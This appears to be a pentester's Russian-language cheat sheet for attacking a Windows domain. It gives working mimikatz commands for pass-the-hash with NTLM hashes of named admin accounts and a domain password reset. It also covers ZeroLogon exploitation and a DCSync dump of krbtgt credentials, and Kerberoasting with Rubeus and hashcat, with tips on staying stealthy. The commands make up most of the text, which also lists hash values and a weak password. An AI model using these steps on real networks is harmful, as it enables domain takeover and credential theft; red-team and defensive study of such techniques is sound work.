# Path-the-Hash
Входные данные:
- требует права для фальсификации токена;

## Запускаем удаленный powershell.
sekurlsa::pth /domain:company.ru /user:kstepanovAdm /ntlm:39aced871bfb9485b15c0ddcd3b456f3 /run:"powershell.exe"

## Меняем пароль пользователя в домене. Пароль должен удовлетворять текущей парольной политике!
sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed8dbae888073 /run:"net user buhramin Qwerty15 /domain"



# ZeroLogon
Входные данные:
- server 2016;
- машина в домене с позможностью запуска ПО;
- отсутствуют средства защиты, которые нельзя отключить.

Замечанияпо атаке:
- может сломать домен-контроллер (перестал работать RDP к dc);
- достаточно прав обычного пользователя.

1. Попытка провести атаку dcsync.
lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:krbtgt /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm
Естественно, не успех.

2. Проверка возможности эксплуатации данной уязвимости.
lsadump::zerologon /target:dc.company.ru /account:dc$

3. Экслуатация.
lsadump::zerologon /target:dc.company.ru /account:dc$ /exploit

4. Атака dcsync.
lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm

5. Восстановление пароля машины штатными средствами (https://winitpro.ru/index.php/2014/09/18/vosstanovlenie-doveritelnyx-otnoshenij-bez-perevvoda-v-domen/):
	5.1. Можно проверить, что связи с dc нет, с помощью nltest /sc_verify:<имя_домена>
	5.2. Зайти от локального администратора, я включил встроенного и заходил от него (надо проверить другие варианты).
	5.3. Есть много команд и командлетов для сброса пароля, но у меня сработал только этот:
		Reset-ComputerMachinePassword -Server dc -Credential company\Adm
	5.4. В статье говорят, что перезагружаться не надо. У меня так не сработало. RDP ожил только после перезагрузки.
	5.5. Повторно проверить наличие связи с dc (см. пункт 5.1).
	
Есть скрипт restorepassword.py (https://github.com/dirkjanm/CVE-2020-1472)


# Kerberoasting

Входные данные:
	- имеется доступ к машине в домене с учетной записью пользователя.
	
Инструменты:
	1. Поиск уязвимых SPN (setspn, rubeus и много других вариантов).

Замечания:	
	- Rubeus по умолчанию собирается под 3.5 framework, а на Windows 10 дефолтный 4.5. Можно просто пересобрать, дабы ничего на атакованную машину лишнего не ставить.
	
Достоинства:
	- скрытность:
		+ запрос TGS это легитимное действие пользователя.
		+ по сравнению c online подбором пароля сервисной учетной записи в том, что после выгрузке TGS обращение NTLM-хеша проводится в оффлайне;
		
Вопросы:
	- почему данная конфигурация возможна? Например, SQL Server 2014 самостоятельно создает сервисные записи с нормальными паролями.

Примеры использования:
	- PT (https://youtu.be/WE8JjboUtDY?t=1962)
	
Порядок дейстия для rubeus-а:
	1. #rubeus kerberoast - выводит найденные TGS REP в консоль.
	   #rubeus kerberoast /outfile:<outputFilePath> - выводит найденные TGS REP в файл
	2. Подбор по словарю john (не получилось) и hashcat.
	

